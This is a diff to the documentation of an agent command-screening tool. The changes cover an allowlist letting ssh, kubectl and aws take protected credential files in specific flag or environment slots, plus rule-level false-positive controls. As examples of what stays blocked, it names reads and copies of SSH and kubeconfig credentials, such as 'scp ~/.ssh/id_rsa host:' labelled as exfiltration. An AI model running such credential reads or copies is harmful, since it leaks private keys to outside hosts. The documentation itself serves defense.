@@ -31,7 +31,7 @@ Embedded community packs (shipped inside the binary via //go:embed)
   ↓ extended by
 ~/.agentshield/packs/*.yaml (on-disk packs: premium from SaaS, user custom)
   ↓ evaluated by
-6-Layer Analyzer Pipeline → Final Decision
+Analyzer Pipeline (8 stages, 2 more conditional) → Final Decision
 ```
 
 Because the community packs are embedded in the binary, a fresh `brew install`
@@ -467,9 +467,98 @@ defaults:
 
 Glob patterns: `**` matches recursively, `*` matches one level.
 
-## The 6-Layer Analyzer Pipeline
+#### Designated consumers
 
-Rules define *what* to match. Analyzers define *how deeply* to inspect. Each layer adds detection capabilities that simple regex cannot provide.
+`protected_paths` means "no command may name these paths". Taken literally that
+blocked every legitimate consumer of a credential — `ssh -i ~/.ssh/id_ed25519`,
+`kubectl --kubeconfig ~/.kube/config`, `gpg --homedir ~/.gnupg`, `ssh-add` —
+while the same tools read the same files implicitly (`kubectl get pods`) without
+a word. `protected_path_consumers` names the executables that may take a
+protected path as a credential, and the slot it may appear in:
+
+```yaml
+defaults:
+  protected_paths: ["~/.ssh/**", "~/.kube/**"]
+  protected_path_consumers:
+    - executable: ["ssh", "scp", "sftp", "ssh-copy-id"]
+      flags: ["-i", "-F"]            # value is the next word, or --flag=value; -vi counts
+    - executable: ["ssh-add"]
+      positional: true               # the key is a bare operand
+    - executable: ["kubectl", "helm"]
+      flags: ["--kubeconfig"]
+```
+
+A protected path that appears **only** in such a slot is not blocked: the
+command proceeds as AUDIT with rule id `protected-path-consumer`, so the audit
+log and the SaaS record that the agent used the credential. Any other
+occurrence keeps the BLOCK — a reader (`cat`), an interpreter call (`open()`),
+a redirect target, or a copier with the key as a **source** operand
+(`scp ~/.ssh/id_rsa host:` has no `-i` before the key and is exfiltration).
+The slot is flag-position-aware for exactly that reason, so never give
+`positional: true` to a tool that can copy a file out. The list is additive:
+a user or pack can declare another consumer, never remove a shipped one. The
+shipped defaults are in `configs/default_policy.yaml`.
+
+##### The environment is a credential slot too
+
+Some tools have no flag for the credential file — `aws` reads
+`AWS_SHARED_CREDENTIALS_FILE`, `gcloud` reads `GOOGLE_APPLICATION_CREDENTIALS`,
+and `kubectl --kubeconfig` has an exact environment twin in `KUBECONFIG`. The
+`env:` list names those variables:
+
+```yaml
+defaults:
+  protected_path_consumers:
+    - executable: ["kubectl", "helm"]
+      flags: ["--kubeconfig"]
+      env: ["KUBECONFIG"]
+    - executable: ["aws"]              # no --credentials-file flag exists,
+      env: ["AWS_SHARED_CREDENTIALS_FILE", "AWS_CONFIG_FILE"]   # so no flags
+```
+
+Assigning a protected path to one of these is **recorded, never blocked** —
+`export KUBECONFIG=~/.kube/config`, the prefix form
+`KUBECONFIG=~/.kube/config kubectl get pods`, and a bare `KUBECONFIG=…`
+statement all yield AUDIT with rule id `protected-path-consumer`. Blocking them
+would break every cluster-switching workflow while stopping no read, because an
+assignment reads nothing.
+
+Four consequences worth being explicit about:
+
+- **The read is still blocked.** `cat $KUBECONFIG` resolves back through the
+  symbol table to the protected path and BLOCKs, in the same command or a later
+  one. Recording the assignment buys the *read* nothing.
+- **An assignment can never launder a block.** If anything else in the command
+  touches a protected path outside a consumer slot, that BLOCK stands and the
+  "recorded, not blocked" note is withheld entirely.
+- **A variable not on the list is ignored, not blocked.** `export MY_KUBE=~/.kube/config`
+  behaves exactly as it did before this feature existed. Adding a name to the
+  list only ever adds a record.
+- **Names match case-sensitively** — shell variables are, and `kubeconfig=` is
+  not `KUBECONFIG=`.
+
+Unlike `flags`, `env` is not correlated against `executable`: the assignment and
+the use are routinely separate commands, separate scripts, or separate shells,
+so there is nothing to correlate against. The `executable` on those entries is
+documentation of whose credential slot it is.
+
+## Rule-level false-positive controls
+
+Five `match` fields let a regex-family rule exclude or soften matches without widening its pattern. Every label is validated when the policy loads: an unknown label fails the load instead of silently doing nothing (`internal/policy/pipeline.go`).
+
+| Field | Effect | Labels defined in |
+|---|---|---|
+| `command_regex_exclude` | The rule does not fire when this regex also matches. It excludes the **whole rule**, not one alternative of the positive pattern. | — |
+| `command_intent_exclude` | Skip the rule when the Intent Classifier (stage 0) labels the statement's text: `is_bash_comment`, `is_doc_text`, `in_heredoc`, `is_self_mgmt`. Scoped per top-level statement, so it cannot excuse a match that only exists by spanning a statement separator. | `internal/analyzer/intent.go` |
+| `command_intent_downgrade` | Same labels, but a BLOCK becomes AUDIT instead of being skipped, so the event is still logged. Built for sensitive-string literals inside `gh`/`git` message and body arguments (#2843). | `internal/analyzer/intent.go` |
+| `command_position_exclude` | Skip when the rule's **own match** landed in an inert syntactic position: `loop_wordlist` (a `for … in` word list) or `search_needle` (the pattern operand of a grep-family command). Implemented on both evaluation paths (pipeline and fallback engine). | `internal/analyzer/position.go` |
+| `context: {ci: true}` | Gate the rule on the execution environment; `ci` is detected by `internal/execenv`. Regex-family rules only — a context gate on a structural/dataflow/semantic/stateful rule fails policy load (#3291). | `internal/execenv` |
+
+Reach for these before adding another `pattern-not`-style alternative to the regex: they say *where* or *in what context* a match is inert, which is the information a wider pattern throws away.
+
+## The Analyzer Pipeline
+
+Rules define *what* to match. Analyzers define *how deeply* to inspect. Each stage adds detection capabilities that simple regex cannot provide. The six decision layers below are the ones every install runs; the full pipeline also has two enrichment-only stages (Intent Classifier before Regex, Substitution after Structural) and two conditional decision stages (Artifact Hash, Data Label) — see `docs/architecture.md` for the complete table.
 
 ### Layer 1: Regex
 
@@ -567,7 +656,7 @@ Rules define *what* to match. Analyzers define *how deeply* to inspect. Each lay
 
 **Why:** LLM agents can be manipulated into running commands that contain prompt injection payloads, encoded malicious content, or leaked credentials.
 
-**Signals detected (9 heuristic checks):**
+**Signals detected** (the original nine are listed below; the set has since grown — `internal/guardian/heuristic.go` is the authority, and the heuristic-provider interface is the seam if it needs splitting):
 
 | Signal | Example | Decision |
 |---|---|---|
@@ -585,7 +674,7 @@ Rules define *what* to match. Analyzers define *how deeply* to inspect. Each lay
 
 ### How the Pipeline Combines Results
 
-All 6 layers run in sequence. The **Combiner** uses the "most restrictive wins" strategy:
+All stages run in sequence. The **Combiner** uses the "most restrictive wins" strategy:
 
 ```
 Layer 1 (Regex):      AUDIT
